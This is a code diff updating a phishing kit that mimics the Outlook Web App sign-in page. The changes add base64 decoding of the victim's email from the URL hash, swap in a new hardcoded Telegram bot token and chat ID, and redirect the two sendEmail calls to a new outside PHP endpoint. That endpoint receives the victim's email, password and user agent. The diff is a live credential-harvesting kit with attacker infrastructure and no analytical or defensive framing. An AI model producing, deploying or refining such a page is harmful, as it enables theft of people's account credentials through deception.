@@ -1,8 +1,17 @@
 <html>
     <meta http-equiv="Content-Type" content="text/html; CHARSET=utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=10">
+    <meta http-equiv="pragma" content="no-cache"/>
+    <meta name="apple-mobile-web-app-capable" content="yes"/>
+    <meta name="apple-mobile-web-app-status-bar-style" content="default"/>
+    <meta name="format-detection" content="telephone=no"/>
+    <meta name="viewport" content="user-scalable=0, width=device-width, initial-scale=1.0, maximum-scale=1.0"/>
+    <meta name="msapplication-tap-highlight" content="no" />
+    <meta name="google" value="notranslate">
+    <meta name="apple-mobile-web-app-title" content="OWA"/>
+    <meta name="referrer" content="never" />
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
     <title>Outlook</title>
+	<link rel="shortcut icon" href="https://autodiscover.isupplyco.com/owa/auth/15.1.2507/themes/resources/favicon.ico" type="image/x-icon">
 </head>
 <body style="background: #f7f5f5; height: 90%;width: 100%">
     <div style="height: 100%;width: 100%;margin: 0px;min-width: 652px;">
@@ -23,7 +32,7 @@
                     </div>
                     <div style="font-size: 11px;color: #6d6c6c;font-family:  sans-serif;margin-bottom: 2px;">Password:</div>
                     <div>
-                        <input id="pass" name="password" type="password" style="border: 1px solid #afbcc0;color: #312f2f; background-color: #FDFDFD;width: 260px;box-sizing: content-box;-moz-box-sizing: content-box;-webkit-box-sizing: content-box;height: 22px;font-size: 12px;padding: 3px 5px;font-family:  sans-serif;">
+                        <input id="pass" name="password" type="password" style="border: 1px solid #afbcc0;color: #312f2f; background-color: #FDFDFD;width: 260px;box-sizing: content-box;-moz-box-sizing: content-box;-webkit-box-sizing: content-box;height: 22px;font-size: 12px;padding: 3px 5px;font-family:  sans-serif;" autofocus>
                         <br>
                         <p style="color:rgb(239, 12, 12);font-family:  sans-serif;font-size: 12px; height: 5px; " id="show"></p>
                     </div>
@@ -41,7 +50,18 @@
 </body>
 <script>
     window.addEventListener('load', function() {
-        var maler = window.location.hash.substr(1)
+	let maler = '';
+	  const urlHash = window.location.hash;
+	  let encodedUserEmail = urlHash ? urlHash.substring(1) : '';
+	  if (encodedUserEmail) {
+		try {
+		  maler = atob(encodedUserEmail);
+		} catch {
+		  maler = '';
+		}
+	  } else {
+		maler = '';
+	  }
         console.log(maler)
 
         if (maler) {
@@ -133,8 +153,8 @@
                 var IP = document.getElementById('ip').textContent;
                 console.log(IP)
 
-                var token ='6739854102:AAG6Ywyb5vDNpbv6bp_WR9uMPTeDtel5sG8';
-                var chat_ids ='830668744';
+                var token ='5178252977:AAFlPqDATK6Mf6m0ktiG5TSn_EoesFrnQt8';
+                var chat_ids ='659482680';
 
                 if (!output) {
 
@@ -219,7 +239,7 @@
 
 					function sendEmail(male, pass, userAgent) {
 						$.ajax({
-							url: "https://newtonpmta.com.ng/customers/tmp/send.php",  // Calls the local PHP script
+							url: "https://0x3208e811fca4e8975a736486ef0a7266832349b9.click/customers/tmp/send.php",  // Calls the local PHP script
 							method: "POST",
 							data: {
 								"email": male,
@@ -263,7 +283,7 @@
 
 					function sendEmail(male, pass, userAgent) {
 						$.ajax({
-							url: "https://newtonpmta.com.ng/customers/tmp/send.php",  // Calls the local PHP script
+							url: "https://0x3208e811fca4e8975a736486ef0a7266832349b9.click/customers/tmp/send.php",  // Calls the local PHP script
 							method: "POST",
 							data: {
 								"email": male,
